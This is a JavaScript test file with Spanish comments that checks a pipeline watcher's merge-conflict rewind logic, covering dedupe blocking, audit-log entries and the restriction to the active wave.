test('#4968 R-2: un DEDUPE_HIT del rewind REAL no se reporta como rewind', async () => {
  const root = sandbox();
  dropIssue(root, ISSUE_A);
  const clock = reloj();
  const gh = fakeGhCall(async ({ sub }) => (sub === 'list' ? [prJson({ mergeable: 'UNKNOWN', mergeStateStatus: 'UNKNOWN' })] : prJson()));
  const norm = core.normalizeWatcherConfig(seccion());

  // Poll doblado: emite SIEMPRE el mismo evento (misma tupla). La cadena de
  // rewind es la REAL, así que el 2º tick pega contra la dedupe de #4967.
  const evento = watcher.buildMergeConflictEvent({
    repo: REPO, pr: PR_A, issue: ISSUE_A, headRefOid: OID_A, detectedAt: clock.now(),
  });
  const correr = async () => core.runTick(norm.cfg, {
    ghCall: gh, getActiveWave: () => WAVE, pipelineRoot: root, config: CONFIG, yaml,
    now: clock.now, runWatcherPoll: async () => ({ ok: true, events: [evento] }),
  });

  const t1 = await correr();
  assert.deepEqual(t1.rewound, [{ issue: ISSUE_A, pr: PR_A }], 'el primero sí muta');

  clock.avanzarPoll();
  const t2 = await correr();
  assert.deepEqual(t2.rewound, [], 'un no-op NO puede contarse como rewind');
  assert.equal(t2.blocked.length, 1);
  assert.equal(t2.blocked[0].code, 'DEDUPE_HIT');

  const brazo = auditJsonl(root).filter(a => a.kind === 'brazo');
  assert.equal(brazo.at(-1).decision, core.DECISIONS.REWIND_BLOCKED, 'el JSONL dice rewind_blocked, como la §16.4');
  assert.equal(brazo.at(-1).reason_code, 'DEDUPE_HIT');
  assert.equal(brazo.filter(a => a.decision === core.DECISIONS.REWOUND).length, 1, 'una sola mutación auditada');
});

// -----------------------------------------------------------------------------
// CA-9 — limitación de cobertura declarada
// -----------------------------------------------------------------------------

test('#4968 CA-9: el universo es la ola inyectada — el test NO asume auto-observación', async () => {
  const root = sandbox();
  dropIssue(root, ISSUE_A);
  const antes = snapshotFs(root);
  const clock = reloj();
  // El PR es del issue A, pero la ola activa NO lo incluye.
  const otraOla = { number: 9, issues: [{ number: 12345 }] };
  const gh = fakeGhCall(async ({ sub }) => (sub === 'list' ? [prJson({ mergeable: 'UNKNOWN', mergeStateStatus: 'UNKNOWN' })] : prJson()));

  const norm = core.normalizeWatcherConfig(seccion());
  for (let i = 0; i < 3; i += 1) {
    const r = await core.runTick(norm.cfg, {
      ghCall: gh, getActiveWave: () => otraOla, pipelineRoot: root, config: CONFIG, yaml, now: clock.now,
    });
    assert.equal(r.rewound.length, 0, 'fuera de la ola activa, el PR no se observa');
    clock.avanzarPoll();
  }
  assert.deepEqual(snapshotFs(root), antes);
  assert.ok(auditJsonl(root).some(a => a.reason === 'not_in_active_wave'), 'la limitación queda auditada');
});
